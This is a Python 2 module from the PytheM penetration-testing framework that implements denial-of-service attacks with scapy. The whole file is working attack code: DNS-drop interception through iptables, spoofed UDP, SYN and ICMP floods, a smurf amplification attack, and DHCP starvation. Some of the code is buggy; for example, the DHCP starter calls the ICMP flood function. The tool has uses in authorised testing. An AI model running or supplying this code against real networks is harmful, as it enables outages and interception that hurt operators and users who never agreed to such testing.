#!/usr/bin/python

# Copyright (c) 2016 Angelo Moura
#
# This file is part of the program PytheM
#
# PytheM is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

from netfilterqueue import NetfilterQueue
from scapy.all import *
import os
import socket
import sys
import threading

class Jam(object):

	name = "Denial of Service Module."
	desc = "Denial of service attacks here."
	version = "0.7"
	ps = "Need to add POST DoS attack."

	def __init__(self):
		self.blocks = []
		self.synstop = False
		self.udpstop = False
	def dnsdropstart(self,host):
		os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
                self.host = host
		try:
			print "[+] Man-in-the-middle DNS drop initialized."
			self.t = threading.Thread(name='mitmdrop', target=self.filter)
			self.t.setDaemon(True)
			self.t.start()
		except Exception as e:
			print "[!] Exception caught: {}".format(e)

	def dnsdropstop(self):
		os.system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
		self.t.terminate()
		print "[-] Man-in-the-middle DNS drop finalized."

        def callback(self, packet):
                packet.drop()

        def filter(self):
                try:
                        self.q = NetfilterQueue()
                        self.q.bind(1, self.callback)
                        self.q.run()
                except Exception as e:
                        print "[!] Exception caught: {}".format(e)

	def udpfloodstart(self, host, tgt, dport):
		self.src = host
		self.tgt = tgt
		self.dport = dport
		try:
			print "[+] UDP flood denial of service initialized on port: {}.".format(dport)
			for i in range(0,3):
				u = threading.Thread(name='udpflood',target=self.udpflood)
				u.setDaemon(True)
				u.start()
			self.udpflood()
		except KeyboardInterrupt:
			print "[-] UDP flood denial of service finalized."
		except Exception as e:
			print "[!] Exception caught: {}".format(e)

	def udpflood(self):
		try:
			IP_layer = IP(src=self.src, dst=self.tgt)
			UDP_layer = UDP(sport=1337,dport=self.dport)
			pkt = IP_layer/UDP_layer
			send(pkt, loop=1, inter=0.0, verbose=False)
		except Exception as e:
			print "[!] Error: {}".format(e)

	def synfloodstart(self, host, tgt, dport):
		self.src = host
		self.tgt = tgt
		self.dport = dport
		try:
			print "[+] SYN flood denial of service initialized."
			for i in range(0,3):
				s = threading.Thread(name='synflood', target=self.synflood)
				s.setDaemon(True)
				s.start()
			self.synflood()
		except KeyboardInterrupt:
			print "[-] SYN flood denial of service finalized."
		except Exception as e:
			print "[!] Exception caught: {}".format(e)

	def synflood(self):
		try:
			IP_layer = IP(src=self.src, dst=self.tgt)
			TCP_layer = TCP(sport=1337,dport=self.dport)
			pkt = IP_layer/TCP_layer
			send(pkt, loop=1, inter=0.0, verbose=False)
		except Exception as e:
			print "[!] Error: {}".format(e)


        def icmpfloodstart(self, host, tgt):
                self.src = host
                self.tgt = tgt
                try:
                        print "[+] ICMP flood denial of service initialized."
                        for x in range(0,3):
                                i = threading.Thread(name='icmpflood', target=self.icmpflood)
                                i.setDaemon(True)
                                i.start()
                        self.icmpflood()
                except KeyboardInterrupt:
                        print "[-] ICMP flood denial of service finalized."
                except Exception as e:
                        print "[!] Exception caught: {}".format(e)

	def icmpflood(self):
		try:
			IP_layer = IP(src=self.src, dst=self.tgt)
			ICMP_layer = ICMP()
			pkt = IP_layer/ICMP_layer
			send(pkt, loop=1, inter=0.0, verbose=False)
		except Exception as e:
			print "[!] Error: {}".format(e)


	def icmpsmurfstart(self, tgt):
		self.tgt = tgt
		try:
			multicast = raw_input("[+] IP Address(es) to send echo-requests (separated by commas): ")
			try:
				self.multicast = multicast.split(",")
			except:
				self.multicast
			print "[+] ICMP smurf denial of service initialized."
			for x in range(0,3):
				i2 = threading.Thread(name='icmpsmurf',target=self.icmpsmurf)
				i2.setDaemon(True)
				i2.start
			self.icmpsmurf()
		except KeyboardInterrupt:
			print "[-] ICMP smurf denial of service finalized."
		except:
			print "[!] Error: check the parameters (target)"


	def icmpsmurf(self):
		try:
			while True:
				for ip in self.multicast:
					IP_layer = IP(src=self.tgt,dst=ip)
					ICMP_layer = ICMP()
					pkt = IP_layer/ICMP_layer
					send(pkt, verbose=False)

		except Exception as e:
			print "[!] Error: {}".format(e)


        def dhcpstarvationstart(self):
                try:
                        print "[+] DHCP starvation denial of service initialized."
                        for x in range(0,3):
                                i = threading.Thread(name='dhcpstarvation', target=self.dhcpstarvation)
                                i.setDaemon(True)
                                i.start()
                        self.icmpflood()
                except KeyboardInterrupt:
                        print "[-] DHCP starvation denial of service finalized."
                except Exception as e:
                        print "[!] Exception caught: {}".format(e)



	def dhcpstarvation(self):
		try:
			conf.checkIPaddr = False
			dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
			sendp(dhcp_discover, loop=1, inter=0.0, verbose=False)
		except Exception as e:
			print "[!] Error: {}".format(e)
